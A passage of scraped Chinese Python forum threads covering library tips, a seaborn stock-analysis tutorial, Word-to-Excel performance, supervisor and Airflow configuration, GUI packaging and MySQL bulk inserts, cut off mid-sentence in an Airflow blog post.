"其实，库用的多，对我来说，是因为水平低，经常需要各种库来帮忙，估计高人都是很少几个库就能搞定很多需求了。\r", "\r", "常用的库：\r", "pip install numpy scipy matplotlib xlrd pandas geopy algorithms", "  这样就清爽多了\r", "\r", "慢慢来嘛，水平都是慢慢涨的。。。多分享多交流", " \r", "\r", "嗯，但愿如涓流汇江海", "马克下吧,", " 非常感谢你的回复，我看 pymssql 里面好像有说无法插入超过 8000 字符，我是往已有的程序数据库插入图片，程序已经设计好，主要是取得检验仪器原始数据及图片插入检验系统。\r", "当图片数据超过 8000 ，用 pymssql 插入就报错。不知道有什么办法可以插入大点的图片图片大小在 8k-50k 之间。", " \r", "\r", "你先确认下 是否是  pymssql 的限制  8000 字符，也看看是否有可能是 SQL SERVER 上有字符限制。。。\r", "\r", "如果确认 pymssql 的限制，那如果有源码的话 看看为啥这么限制，是否可以去掉限制，或者可以设置这个限制大小\r", "\r", "最后没有办法的办法，有没有库可以压缩下图片，比如 pillow 研究下，是否有可能在程序里面先压缩，然后再存"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>今天，我想和大家分享一下一些分析股票的方法。在这里以贴代码为主，大家感兴趣的话直接复制运行就可以生成相应的图表分析了。</p>\n<h1>一、股票的基本信息</h1>\n<p><strong>分析股票示例（以 600050.XSHG 中国联通 为例），导入股票各项信息</strong></p>\n<pre><code>data = DataAPI.MktEqudGet(secID=u\"\",ticker=u\"600050\",beginDate=u\"\",endDate=u\"\",isOpen=\"\",field=u\"secID,secShortName,tradeDate,openPrice,highestPrice,lowestPrice,closePrice,turnoverVol\",pandas=\"1\")\ndata_hou = DataAPI.MktEqudAdjAfGet(secID=u\"\",ticker=u\"600050\",tradeDate=u\"\",isOpen=\"\",beginDate=u\"\",endDate=u\"\",field=u\"secID,tradeDate,closePrice\",pandas=\"1\")\ndata_hou = data_hou.rename(columns = {'closePrice':'Adj_closePrice'})\ndata_new = pd.merge(data,data_hou,on='tradeDate')\ndata_new = data_new.set_index('tradeDate')\ndata_new1 = data_new.copy()\ndata_new1.head().append(data_new1.tail())\n\n</code></pre>\n<p>简单统计分析，输入下方代码即可显示出股票的开盘价，最高价，最低价，收盘价，成交量，前复权收盘价。</p>\n<pre><code>data_new1.describe()\n\n</code></pre>\n<p>股票收盘价走势</p>\n<pre><code>data_new1['Adj_closePrice'].plot(legend=True,figsize=(14,6))\n\n</code></pre>\n<p>成交量走势</p>\n<pre><code>data_new1['turnoverVol'].plot(legend=True,figsize=(14,6))\n\n</code></pre>\n<p>移动平均线走势图</p>\n<pre><code>ma_day = [10,20,50]\n\nfor ma in ma_day:\n    column_name = \"MA for %s days\" %(str(ma))\n    data_new1[column_name]=pd.rolling_mean(data_new1['Adj_closePrice'],ma)\n\n</code></pre>\n<pre><code>data_new1[['Adj_closePrice','MA for 10 days','MA for 20 days','MA for 50 days']].plot(subplots=False,figsize=(14,6))\n\n</code></pre>\n<p>股票每天的百分比变化</p>\n<pre><code>data_new1['Daily Return'] = data_new1['Adj_closePrice'].pct_change()\ndata_new1['Daily Return'].plot(figsize=(14,6),legend=True,linestyle='--',marker='o')\n\n</code></pre>\n<p>平均收益直方图</p>\n<pre><code>data_new1['Daily Return'].hist(color=\"#4878cf\")\n\n</code></pre>\n<p>每日收益图</p>\n<pre><code>sns.distplot(data_new1['Daily Return'].dropna(),bins=100, color=\"b\")\n\n</code></pre>\n<p><strong>分析多支股票示例（以 600050.XSHG ， 000651.XSHG ， 600158.XSHG,600115.XSHG 为例）</strong></p>\n<p>将每个公司的每日收盘价的百分数变化，及涨幅或者降幅，可以评估其涨幅前景</p>\n<pre><code>tech_rets = data_all2.pct_change()\ntech_rets.head()\n\n</code></pre>\n<p>然后看某一支股票自身的线性相关系</p>\n<pre><code>sns.jointplot('000930','000930',tech_rets,kind='scatter',color='seagreen')\n\n</code></pre>\n<p>不同股票的线性相关系</p>\n<pre><code>sns.jointplot('000930','600115',tech_rets,kind='scatter')\n\n</code></pre>\n<p>四个公司一起比较，该函数用于成对的比较不同数据集之间的相关性，而对角线则会显示该数据集的直方图</p>\n<pre><code>sns.pairplot(tech_rets.dropna())\n\n</code></pre>\n<p>对角线直方图</p>\n<pre><code>returns_fig = sns.PairGrid(tech_rets.dropna())\n\n</code></pre>\n<p>右上角散点图</p>\n<pre><code>returns_fig.map_upper(plt.scatter,color='purple')\n\n</code></pre>\n<p>左下角核密度图</p>\n<pre><code>returns_fig.map_lower(sns.kdeplot,cmap='cool_d')\n\n</code></pre>\n<p>对角线直方图</p>\n<pre><code>returns_fig.map_diag(plt.hist,bins=30)\n\n</code></pre>\n<p>原股票数据的分析</p>\n<pre><code>returns_fig = sns.PairGrid(data_all2)\nreturns_fig.map_upper(plt.scatter,color='purple')\nreturns_fig.map_lower(sns.kdeplot,cmap='cool_d')\nreturns_fig.map_diag(plt.hist,bins=30)\n\n</code></pre>\n<p>四支股票相关系数</p>\n<pre><code>sns.corrplot(tech_rets.dropna(),annot=True)\n\n</code></pre>\n<h1>二、股票的风险信息</h1>\n<p><strong>推测最多亏多少钱</strong></p>\n<pre><code>rets = tech_rets.dropna()\narea = np.pi*20\nplt.scatter(rets.mean(), rets.std(),alpha = 0.5,s =area)\nplt.xlabel('Expected returns')\nplt.ylabel('Risk')\n\n#分别以 rets 的平均值，标准差为 xy 轴\nfor label, x, y in zip(rets.columns, rets.mean(), rets.std()):\n    plt.annotate(\n        label, \n        xy = (x, y), xytext = (50, 50),\n        textcoords = 'offset points', ha = 'right', va = 'bottom',\n        arrowprops = dict(arrowstyle = '-', connectionstyle = 'arc3,rad=-0.3'))\n\n</code></pre>\n<p><strong>运行一下可以看到图表中 600158.中体产业 的预计收益要高于其他三家公司，但是风险值也要高于其他三家公司。</strong></p>\n<p>分析之前看一下基本信息，以 600050.XSHG 为例</p>\n<pre><code>sns.distplot(data_new1['Daily Return'].dropna(),bins=100, color=\"b\")\n\n</code></pre>\n<p>百位分数， 95%的置信</p>\n<pre><code>rets['600050'].quantile(0.05)\n\n</code></pre>\n<p><strong>一天的损失不会超过 0.0356,</strong>\n<strong>如果我们有一百万的投资，我们一天 5% VaR 为 0.0356 * 1000000 = 35600 元</strong></p>\n<h1>三、基于风险价值的蒙特卡洛方法</h1>\n<pre><code>days = 365\ndt = 1./days\nmu = rets.mean()['600050']\nsigma = rets.std()['600050']\n\ndef stock_monte_carlo(start_price,days,mu,sigma):\n    price = np.zeros(days)\n    price[0] = start_price\n    shock = np.zeros(days)\n    drift = np.zeros(days)\n    \n    for x in xrange(1,days):\n        shock[x] = np.random.normal(loc=mu * dt, scale=sigma * np.sqrt(dt))\n        drift[x] = mu * dt\n        price[x] = price[x-1] + (price[x-1] * (drift[x] + shock[x]))\n    return price\n\n</code></pre>\n<pre><code>start_price = 2.924\n\nfor run in xrange(100):\n    plt.plot(stock_monte_carlo(start_price,days,mu,sigma))\nplt.xlabel(\"Days\")\nplt.ylabel(\"Price\")\n\n</code></pre>\n<pre><code>runs = 10000\nsimulations = np.zeros(runs)\nnp.set_printoptions(threshold=5)\nfor run in xrange(runs):    \n    simulations[run] = stock_monte_carlo(start_price,days,mu,sigma)[days-1];\n\n</code></pre>\n<pre><code>q = np.percentile(simulations, 1)\nplt.hist(simulations,bins=200)\nplt.figtext(0.6, 0.8, s=\"Start price: %.2f\" %start_price)\nplt.figtext(0.6, 0.7, \"Mean final price: %.2f\" % simulations.mean())\nplt.figtext(0.6, 0.6, \"VaR(0.99): %.2f\" % (start_price - q,))\nplt.figtext(0.15, 0.6, \"q(0.99): %.2f\" % q)\nplt.axvline(x=q, linewidth=4, color='r')\nplt.title(u\"Final price distribution for 600050 after %s days\" % days, weight='bold')\n\n</code></pre>\n<p><strong>这种方法基本上是你购买的股票的风险将在 0.16 元 （约 99% 的时间里，蒙特卡洛模拟的结果）</strong>\n如果想自己画股票的 K 线图，可以参考这篇帖子：\n<a href=\"https://uqer.io/community/share/57cac259228e5b5b831173c2\" rel=\"nofollow\">https://uqer.io/community/share/57cac259228e5b5b831173c2</a></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "『python 金融应用』如何用 seaborn 包来分析股票", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>本人小白，学 python 一个多月，想自动化一些办公流程，所以就写了个将目录下所有 word 文件遍历，再将制定列复制到 excel 的程序。</p>\n<p>测试优化了一个星期，然后发现了一个以我现在的了解无法解决的问题。同样是将 1300 行传送到 excel 中，我用程序跑 13 个 100 行的文件用不到 20 秒，但如果是跑一个大文件就要用 200 秒。期初我以为是 list 太大了，改成每 100 行传送一次，而不是一个大 list ，然后运行时间没有丝毫改变。。。</p>\n<p>我觉得是 list 存取什么的问题？不太懂，所以求助啊~~~</p>\n<p>代码如下</p>\n<pre><code>import os\nfrom openpyxl import Workbook\nfrom openpyxl.styles import PatternFill\nfrom docx import Document\nimport re\nimport time\n\n#excel part\nwb = Workbook()\nws = wb.active\nfil = PatternFill(start_color='FFFF00', end_color='FFFF00',fill_type='solid')\n\n#os part\ndest_dir = input('请输入外部审校文件所在路径。\\n&gt;').replace(\"\\\\\", \"/\")\n\ndef copy(range):\n    return str(t.cell(range, 2).text)\n\ndef del_blank(text):\n    return text != ''\n\ndef clean_tag(text2):\n    return re.sub('&lt;'r'/?[a-z]{0,3}[0-9]{0,5}/?''&gt;', '', text2)\n\nfor root, dirs, files in os.walk(dest_dir):\n    pass\n\nfor name in files:\n    t = Document(os.path.join(dest_dir, name)).tables[0]\n    ws.append({'B': name})\n    ws['B' + str(ws.max_row)].fill = fil\n    j = list(range(len(t.rows)))\n    r1 = list(map(clean_tag, filter(del_blank,map(copy, j))))\n    r2 = [n for n in range(len(t.rows))]\n    for row in zip(r2, r1):\n        ws.append(row)\n\nwb.save(dest_dir + '/删重文件.xlsx')\n\n</code></pre>\n</div></div>"], "reply": "10", "tittle": "求助，用 python 从 word 向 excel 导入文本，相同文件拆分后速度快了 10 倍", "comment": ["应该是你用的这个库： openpyxl 的文件读写性能问题\r", "office 的读写库很多，也有官方组件可以调用，多试两个一比对就明了了\r", "\r", "试好回来写个报告", "这种要自己 profile 一下才知道瓶颈在哪里, 光是猜测没用\r", "试试 cProfile, memory_profiler, 以及 line_profiler 这类工具", ">>r1 = list(map(clean_tag, filter(del_blank,map(copy, j))))\r", "\r", " 改成\r", "filterd = filter(del_blank,map(copy, j))\r", "r1 = list(map(clean_tag, flilterd))\r", "试试", " 好像不是，我分开测过时间，耗时都在\r", "···\r", "r1 = list(map(clean_tag, filter(del_blank,map(copy, j))))\r", "···\r", "这一句上", " 没有变化啊，我挨个拆开试过，虽然是一步步赋值，但 python 是一块计算的", " 我去试试，还没接触过这个", "什么不用.net\r", "毕竟都是自家人", "Python 处理数据最好用`Pandas`和`Numpy`，这两个是历尽考验的大数据库", "r1 = list(map(clean_tag, filter(del_blank,map(copy, j))))\r", "    r2 = [n for n in range(len(t.rows))]\r", "试试看把这个 r1 和 r2 拆成多个生成器表达式\r", "\r", "还有,多次用同一个正则的话,最好预编译好,再调用,不要直接用 re.sub\r", "\r", "通过 Profile,如果发现瓶颈在 copy(range)的话,那就要考虑换一个 docx 的解析库了,就如楼上所说", "问题解决了，时间都消耗在从 word 取出文本放在数列了\r", "for cell in t.columns[2].cells:\r", "        j.append(re.sub('<'r'/?[a-z]{0,3}[0-9]{0,5}/?''>', '', cell.text))\r", "改成这句之后速度提高了 20 倍"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>The Zen of Python, by Tim Peters</p>\n<p>Beautiful is better than ugly.\nExplicit  is better than implicit.\nSimple    is better than complex.\nComplex   is better than complicated.\nFlat      is better than nested.\nSparse    is better than dense.\nReadability counts.\nSpecial cases aren't special enough to break the rules\nAlthough practicality beats purity.\nErrors should never pass silently.\nUnless explicitly silenced.\nIn the face of ambiguity ,refuse the temptation to guess.\nThere should be one-- and preferably only one --obvious was to do it.\nAlthough that way may not be obvious at first unless you're Dutch.\nNow is better than never.\nAlthough never is often better than <em>right</em> now.\nIf the implementation is hard to explain,it's a bad idea.\nIf the implementation is easy to explain,it'mav be a good idea.</p>\n</div></div>"], "reply": "7", "tittle": "python 之禅", "comment": ["python -c \"import this\"", "搞不懂，这都能发一贴？？发帖之前起码排排版", "没看内容,名字倒是让我想起了公司用的禅道,那叫一个难用,没见过这么难用的任务管理", " 用禅道的路过， boss 喜欢，无法。话说有什么好的任务管理系统推荐么？", "太水了, 散了吧", "现在都这样骗铜币的？（滑稽）", " 我觉得原来用的 redmine 不错的,不懂为啥换到禅道"]},
{"content": ["<div class=\"topic_content\">目前我是看网页源码找几个最近的标签试出来唯一性的，当然如果标签一些属性唯一还好说，不然就得多试几个，或者叠加搜索。\r<br>\r<br>chrome 倒是带了复制元素选择器 /XPath ，但是 bs 好像还不支持直接使用，有谁有啥好的解决办法么？</div>"], "reply": "8", "tittle": "使用 BeautifulSoup 解析网页时，怎么快速定位到想要的数据位置", "comment": ["lxml 支持 xpath ，解析的效率也比 BS 高不少。", "pyquery", "select('body > div > div > ul > li > span[class=\"cls1\"]') 这样？", " 我就这么干的。但是 bs 版本低了不支持 span[class=\"cls1\"]这样的写法, 蛋疼。", "生成 BS 对象时选择 lxml ，不要用默认的", "bs 支持 css 语法吧，在 firefox 里复制唯一选择器(大部分情况下比 chrome 获取的短一些)。\r", "把这个直接用 select 方法就可以获取到了。\r", "用 html.parser 解析就可以。", " \r", " \r", " \r", " \r", " \r", "\r", "谢谢各位，我最近试一下解析，有什么好的方案我会 append 出来的", "xpath lxml 最快"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我的 supervisor.conf 如下：</p>\n<pre><code>; Sample supervisor config file.\n;\n; For more information on the config file, please see:\n; http://supervisord.org/configuration.html\n;\n; Notes:\n;  - Shell expansion (\"~\" or \"$HOME\") is not supported.  Environment\n;    variables can be expanded using this syntax: \"%(ENV_HOME)s\".\n;  - Comments must have a leading space: \"a=b ;comment\" not \"a=b;comment\".\n\n[unix_http_server]\nfile=/tmp/supervisor.sock   ; (the path to the socket file)\n\n[inet_http_server]         ; inet (TCP) server disabled by default\nport=127.0.0.1:9001        ; (ip_address:port specifier, *:port for all iface)\nusername=user              ; (default is no username (open server))\npassword=123               ; (default is no password (open server))\n\n[supervisord]\nlogfile=/tmp/supervisord.log ; (main log file;default $CWD/supervisord.log)\nlogfile_maxbytes=50MB        ; (max main logfile bytes b4 rotation;default 50MB)\nlogfile_backups=10           ; (num of main logfile rotation backups;default 10)\nloglevel=info                ; (log level;default info; others: debug,warn,trace)\npidfile=/tmp/supervisord.pid ; (supervisord pidfile;default supervisord.pid)\nnodaemon=false               ; (start in foreground if true;default false)\nminfds=1024                  ; (min. avail startup file descriptors;default 1024)\nminprocs=200                 ; (min. avail process descriptors;default 200)\n\n[rpcinterface:supervisor]\nsupervisor.rpcinterface_factory = supervisor.rpcinterface:make_main_rpcinterface\n\n[supervisorctl]\nserverurl=unix:///tmp/supervisor.sock ; use a unix:// URL  for a unix socket\nserverurl=http://127.0.0.1:9001 ; use an http:// url to specify an inet socket\nusername=user              ; should be same as http_username if set\npassword=123                ; should be same as http_password if set\n\n\n[include]\nfiles =ci_ios/webhook/wsgi.py\n[program:wsgi]\ncommand=~/Documents/supervisor/env/bin/gunicorn --chdir ~/Documents/supervisor\n/ci_ios/webhook -b 0.0.0.0:8000 wsgi:application\nstartsecs=0                                                                             \nstopwaitsecs=0                                                                         \nautostart=false                                                                         \nautorestart=true                                                                       \nstdout_logfile=/tmp/gunicorn.log                         \nstderr_logfile=/tmp/gunicorn.err \n\n</code></pre>\n<p>然后我直接启动命令，<code>~/Documents/supervisor/env/bin/gunicorn --chdir ~/Documents/supervisor/ci_ios/webhook -b 0.0.0.0:8000 wsgi:application</code>，\n没有报错，可以正常启动：</p>\n<pre><code> Starting gunicorn 19.6.0\n[2016-12-29 15:23:45 +0800] [35578] [INFO] Listening at: http://0.0.0.0:8000 (35578)\n[2016-12-29 15:23:45 +0800] [35578] [INFO] Using worker: sync\n[2016-12-29 15:23:45 +0800] [35581] [INFO] Booting worker with pid: 35581\n^C[2016-12-29 15:23:54 +0800] [35578] [INFO] Handling signal: int\n[2016-12-29 15:23:54 +0800] [35581] [INFO] Worker exiting (pid: 35581)\n</code></pre>\n<p>但是我通过<code>supervisord -c supervisor.conf</code>就会报错：</p>\n<pre><code>Error: File contains no section headers.\nfile: /Users/djx/Documents/supervisor/ci_ios/webhook/wsgi.py, line: 2\n'from __future__ import with_statement\\n'\nFor help, use /Users/djx/Documents/supervisor/env/bin/supervisord -h\n</code></pre>\n<p>可是谷歌了半天也不知到底该怎么改，我保存的 py 格式是 UTF-8 无 BOM 。</p>\n<p>还有我的项目目录的结构是</p>\n<pre><code>~/Documents/supervisor/\n\n\t              ci_ios/webhook/wsgi.py\n                      \n                      supervisor.conf\n                      \n</code></pre>\n<p>希望大神赶快出现，我实在无力解决。</p>\n</div></div>"], "reply": "5", "tittle": "supervisor 总是报错，不知能否求助一下", "comment": ["files 这个节点是用来加载配置的，你这个 python 文件是什么内容？一个配置文件写一个应用（ program:app ）", "还有路径最好别用～，用绝对路径", " 我这里的 python 文件内容是\r", "```\r", "#coding=utf-8\r", "from __future__ import with_statement\r", "from app import create_app\r", "\r", "\r", "application = create_app()\r", "if __name__ == \"__main__\":\r", "    application.run()\r", "```", "你把下面这段放到一个文件里面\r", "[program:wsgi]\r", "command=~/Documents/supervisor/env/bin/gunicorn --chdir ~/Documents/supervisor\r", "/ci_ios/webhook -b 0.0.0.0:8000 wsgi:application\r", "startsecs=0                                                                             \r", "stopwaitsecs=0                                                                         \r", "autostart=false                                                                         \r", "autorestart=true                                                                       \r", "stdout_logfile=/tmp/gunicorn.log                         \r", "stderr_logfile=/tmp/gunicorn.err \r", "\r", "然后 file 这个 section 包含这个文件所在的目录\r", "再重启 supervisord 就好了\r", "你在命令行执行 echo_supervisord_conf ，看看 files 的例子就知道了", " 谢谢 我发现我自己搞定了 谢谢"]},
{"content": ["<div class=\"topic_content\">又到抢票的时候了，朋友介绍了个黄牛，用了几次，每次都能抢到。\r<br>\r<br>他们的方法是：\r<br>1.身份信息给黄牛\r<br>2.黄牛抢以票，给我他的 12306 账号和密码，我登录进去付款。\r<br>3.给黄牛手费\r<br>\r<br>如果不给手续费，黄牛可以进去退票。黄牛自称 99%的成功率，朋友也说一直都不错。\r<br>\r<br>黄牛说是买的软件，收费一次 100-150 不等。\r<br>\r<br>我推测黄牛刷票软件的原理，如下：\r<br>1.多电脑多 ip 登一个 12306 账号刷，这种可能很猛，但会有被 k 号的风险\r<br>2.电脑多浏览器，比如沙盒 然后用 py 之类的控制不同浏览器刷\r<br>3.py 直接模拟登录，刷票\r<br>\r<br>如此，一台电脑可以挂上百浏览器不停的刷，不过也存在问题，验证码这一关就不好过，想不通。\r<br>\r<br>请高手分解，谢谢！</div>"], "reply": "9", "tittle": "黄牛是用 python 刷火车票吗?", "comment": ["现在还能有黄牛？觉得应该改名叫抢票员了吧？", "啊?python 不是编程语言？怎么刷票", "微信钱包-火车票机票\r", "带抢票功能的 虽然没实际用过 不知道成功率~", " 不过我确实是找黄牛买到票了", "我是用 python 弄了一个抢票的，不过是浏览器自动化操作的抢票。。。。", " 具体说说", "有的黄牛根本不用这 车站都会内部预留票的 和在车站工作的谈好分成 只要身份证号就能买到 有些事情不是技术才能办到额", " 验证码怎么破？", "有一种神奇的网站叫“打码兔”"]},
{"content": ["<div class=\"topic_content\">我现在做的一个模块是在字符串中匹配城市名，比如：\r<br>print(printCityName('上海市 2016 事业单位招聘计划'))\r<br>结果显示：'上海市'\r<br>\r<br>在这个模块里首先从数据库中取出全部城市名，取出来后存到一个列表里)，执行 printCityName()时在列表里挨个试，直到取出符合条件的内容为止，取不出来输出''。\r<br>\r<br>我这样做是想让主程序内容更少些，但是这样做的结果就是每次都要读取数据库，内容少还行，如果有几百万条几千万条数据，那就太累了。\r<br>应该怎么做能一次性把数据库装载到内存里，然后多次调用呢？</div>"], "reply": "7", "tittle": "如何一次装载，多次调用？", "comment": ["redis", "几百万条数据全部装内存里，这个想法很危险", " 不是啊，我只是要把全国的城市名和县区名装到内存里", " 一个 arraylist 不就行了", " \r", " \r", "搞定了，用了一个类，以前不习惯用类，现在才知道类的好处。把数据加载和查询分开成两个函数，放在一个类里，在主程序里各自调用就行了。", " \r", "给个代码参考一下如何？学习一下，我也有个列表和数据库里面的列表比对归类！一直没有好办法。", " 你要比对的话只能遍历一遍了，\r", "\r", "citylist = ['北京','上海','南京','杭州'......]\r", "textstr = '上海 2016 年事业单位招聘计划'\r", "\r", "for city in citylist:\r", "++if city in textstr:\r", "++++print(city)\r", "++++break"]},
{"content": ["<div class=\"topic_content\">如题！</div>"], "reply": "10", "tittle": "有没有比较完整的 Python 官方和第三方库的在线中文文档？", "comment": ["你需要买本书", " 书不方便携带，如果有在线的类手册的文档，查阅起来会很方便。", "\r", "不过不是中文", "sudo apt install zeal", "不要用中文", "社区驱动的语言大部分都没有能力翻译文档的，学好英语才是正道", "jinkan", "建议用英文文档，高中英语水平即可"]},
{"content": ["<div class=\"topic_content\">Py2app 从来没成功过\r<br>PyInstaller 以前还可以的，刚刚又打不出来了\r<br>\r<br>果然还得学一门正儿八经的语言啊， Swift C#二选一</div>"], "reply": "41", "tittle": "感觉给 Python GUI 应用打包完全看脸", "comment": ["你的好友 electron 已上线", "cx_freeze 呢\r", "\r", "反正感觉 py 打包就是各种第三方库在搞事", "我转投 C#+WPF 了，感觉还行！", " 不熟悉 js ，不过感觉 electron 打出的包都贼大\r", "\r", " 这玩意不能打 .app 包吧。刚学 PyQt 的时候感觉贼爽，又是 GUI 又是跨平台，打包的时候搞事也是最厉害的\r", "\r", " C#上手快吗？第三方库和 Py 比如何？", " 学过 C 不？差不多。基本上难度几乎没有，简单到爆炸，错误一般都是在编译前自行提示了， Intelllisense 很好用。 WPF 的 XAML 就是和 XML 差不多，用类似 HTML 的标记语言描述界面，用 C#操作数据。\r", "XAML+C#等价于 HTML+JS 。\r", "好处在于， native ， driectX 渲染，速度快。直接对显示尺寸操作，不考虑像素，爽。", " 初中的时候学过，估计忘得差不多了……\r", "打算试试 UWP ，练练手", " 这年头只要安装包不是大的很过分，一般来说没有人会在乎吧。反正楼主都要新学一个语言，学完 js 能做的东西比 C#或者 Swift 多多了。", " 下学期学校要学 PHP 、 SQL 和 Python ，感觉同时学多个语言会思维错乱吧……", "不要黑我大 Python 另外请用 Py2exe", " 和 cx_freeze 比有什么优势", "有问题说问题，你这个黑的没意思，打包不成功报错日志里看看", " C# 觉得在 win 上是不错，但是移植到 *nix 呢  mono ？ 哈哈", "pyinstaller 打包 PyQt4 应用没遇到问题", "\r", "\r", "C+makefile 也是个不错的选择", " *nix 就老老实实用 terminal 去……", " PyQt5 全是问题", "问题是， Swift C#都不跨平台啊", "直接用 QT 。。", " Xarmarin?", "PyInstaller 打包 是缺少 dll 吗？", " image not found", "我用 pyinstaller 打包 pyqt5 并无问题。", "什么叫正儿八经的语言阿。。我人生苦短表示不服。。 python 哪里不正经啊喂！\r", "另外我觉得你需要认清每种语言的定位。。。", "Qt with C++\r", "这语言你迟早要学的", "WPF 真的很不错（如果不考虑除了 Windows 之外的其他的平台的话）", "发现问题 -> 分析问题 -> 处理问题 -> 解决问题 -> 总结问题", " py2exe 就是垃圾， pyinstaller 就是因为 py2exe 太垃圾才揭竿而起的。", " 对不起，我指的是学一门编译语言……\r", "毕竟脚本语言环境什么的的还是很麻烦的……", "electron ！ electron ！ electron ！\r", "学门 js 你什么都能做（滑稽", " 是啊，我也不懂学校干嘛还教 PHP ，教 js 前后端通吃不好吗", " 更新教学内容要层层审核，就算更新了也不涨工资，吃力不讨好（滑稽）", "用前几天看到的一个回复来说就是:\r", "C#在 Windows 下的稳定性不用怀疑;\r", "C#在*nix 下的稳定性不用怀疑.", "cxfreeze 我打包用的多，但是同样命令， 2.7 的 python 打包是一个文件， 3.4 打包多出好多文件， 3.4 里面打包自己的 qtfree dome 都报错，不过大部分串口解码不用界面，也还行", "pyinstaller 打包效果最好。\r", "记住用 32 位的打包。\r", "注意 win 下路径问题。\r", "\r", "基本上坑就很少了。", "python 社区的力量基本没在 GUI 上吧? 你这属于在大家都不关注的地方趟地雷.", " 好吧。。。不过你这个“编译语言”用的不准确，毕竟现在很多语言都不能简单的用编译型语言，解释型语言来分类了对吧。。。 java 、 c#和 Go(比如 go run 这样)表示你要如何解释？\r", "看题主说了 GUI ，如果是 win 下的那我强烈推荐你 wpf 。。。\r", "而且嘛，完全没必要纠结哪种语言阿。。各有优点对吧(PS:毕竟我个人觉得语言环境什么的真不是问题)", " 感觉，能跨平台的 gui ，还真没几个一只手就能数清", " 没错，，貌似只有 Qt 可选了。。。", "几个使用 cx_freeze 打包的例子，仅供参考! ", "我选 delphi,别打我", "Gui 没啥玩的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>现在需要用 python 对 mysql 数据库进行读写，\n具体用到的语句是：</p>\n<p>insert into talbe(,,,,,) values(,,,,)</p>\n<p>on dupicate update</p>\n<p>c=c+1 。。。。</p>\n<p>也就是说每一次的数据库的操作涉及到  查询并插入  或查询并修改  环节。。</p>\n<p>想问一下我现在有 2000 个的文本文件，每个文件有 2 万行，按行读取并操作，如果想达到 合适的效率</p>\n<p>我应该选择使用多线程还是多进程  进行读写  并操作数据库呢？</p>\n<p>谢谢！~</p>\n<p>另外如果做得话，有没有参考的文档或者代码，谢谢！~</p>\n</div></div>"], "reply": "11", "tittle": "python 访问 Mysql 数据库，是多线程好还是多进程好？", "comment": ["处理成 csv 使用 load data 导入效率最高\r", "\r", "see ", " 但是我还要对这些数据进行一些程序上的过滤~，应该怎么办呢", " 如果你的目标是快速导入的话并且不强调数据的关联性\r", "可以吧数据处理好成 csv 然后倒入之\r", "如果数据存在关联性则是直接结构化成 csv 然后写 SQL 处理\r", "\r", "如果你要坚持采用你现有方案导入速度难以提升", " 过滤完，存 csv ，再导入", " 好的 谢谢", " 好的 谢谢", "  谢谢", "多线程 多进程 应该不是问题，反正是写时拷贝，资源上没问题，\r", "数据上 注意保持事务一致性，就可以了", "控制好事务就可以了！", " 能详细说一下事务的一致性吗？", " 百度搜吧 事务很简单的，一般应用数据系统 事务是基础"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>原文地址： <a href=\"https://morefreeze.github.io/2016/12/airflow.html\" rel=\"nofollow\">https://morefreeze.github.io/2016/12/airflow.html</a></p>\n<p>最近被线上任务折磨得不行了，总是隔三差五出各种问题，导致日志丢了或者脚本没跑成功，\n出了问题就需要手动去修复，比如手动把少的日志补齐，重跑失败的脚本。有些脚本之间有依赖关系，\n手动跑起来就比较复杂，需要隔一会看一眼脚本有没有跑完，再接着跑下一个，严重影响效率。\n所以我想如果有个程序能帮我定义好我的任务依赖关系，由它来自动解决运行时的依赖，\n如果能有可视化界面看到执行状态，管理任务就更好了。\n最近找到一个满足现在这些需求的开源项目—— airflow 。</p>\n\n<hr>\n<h2>安装</h2>\n<p>airflow 的安装十分简单，用 <code>pip</code> 轻松搞定</p>\n<pre><code>export AIRFLOW_HOME=~/airflow\npip install airflow[slack]\nairflow initdb\n</code></pre>\n<p>pip 安装的 slackclient 为可选，当你需要通知到 slack 时才会用到，但我十分建议也一起安装，\n能够及时收到任务执行状况报告。</p>\n<h2>Quick Start</h2>\n<p>不得不说， airflow 的文档非常完善，从快速入门到整个框架的概念解释都很到位。\n看完官方的 <a href=\"https://airflow.incubator.apache.org/tutorial.html\" rel=\"nofollow\">tutorial</a>就可以开始干活了。\n如前所说，我需要先设置一个 DAG 对象的一些属性，比如重试策略，起止时间，执行环境等，\n就像这样：</p>\n<p>{% highlight python linenos  %}\ndefault_args = {\n'owner': 'airflow',\n'depends_on_past': False,\n'start_date': datetime.datetime(2015, 6, 1),\n'email': ['morefreeze@gmail.com'],\n'email_on_failure': False,\n'email_on_retry': False,\n'retries': 1,\n'retry_delay': datetime.timedelta(minutes=5),\n# 'end_date': datetime(2016, 1, 1),\n}\n{% endhighlight %}</p>\n<p>参数看描述基本都可以理解，第三行的<code>depends_on_past</code> 表示就是是否依赖上一个自己的执行状态。\n如果设置了 <code>email</code> 相关的配置，需要在 <code>airflow.cfg</code> 中配置下发件邮箱。\n因为这个任务会一直执行下去，所以我把结束时间注释掉了。</p>\n<p>以上只是配置了 DAG 的参数，下面建立了一个 dag 对象：</p>\n<pre><code>dag = DAG(\n    'tutorial', default_args=default_args, schedule_interval='* * * * *')\n</code></pre>\n<p>这里我修改了下官方的例子，<code>schedule_interval</code> 表示执行的周期，\n我改成了 crontab 的形式，这样更直观也方便修改，\nairflow 也提供一些字面意思的值表示执行周期，比如<code>@hourly</code>等，这会让脚本在 X 时 0 点执行，\n但如果真在线上执行，我们一般会将不同脚本错锋执行，不会全设成 X 时 0 分执行，所以我建议用 crontab 形式的写法更好。</p>\n<p>下面就开始定义任务了，实际上，在定义这个任务的过程，就像是在写一个 shell 脚本，只是这个脚本的每个操作可以有依赖。\n不同的操作对应了不同的 Operator ，比如 shell 就需要用 BashOperator 来执行。就像这样：</p>\n<pre><code>t1 = BashOperator(\n    task_id='print_date',\n    bash_command='date',\n    dag=dag)\n\n\ntext = '{{ ds }} [%s] has been done' % (dag.dag_id)\nt2 = SlackAPIPostOperator(\n    task_id='post_slack',\n    token='xoxp-your-key-here',\n    channel='#random',\n    username='airflow',\n    text=text,\n    dag=dag\n)\n\nt1 &gt;&gt; t2  # t2.set_upstream(t1)\n</code></pre>\n<p>我又修改了下例子，这个 DAG 包含两个任务 t1 和 t2 ， t1 是个 shell 命令，调用 <code>date</code>显示当前时间，\nt2 